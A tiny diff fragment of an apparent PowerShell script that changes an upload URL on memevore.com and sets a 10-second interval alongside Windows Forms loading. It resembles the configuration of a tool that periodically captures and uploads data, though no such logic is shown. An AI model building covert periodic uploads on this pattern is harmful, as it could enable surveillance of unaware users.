@@ -1,5 +1,5 @@
 # CONFIG
-$uploadUrl = "https://receber.memevore.com/upload"
+$uploadUrl = "https://backend.memevore.com/upload"
 $intervalSeconds = 10
 
 Add-Type -AssemblyName System.Windows.Forms
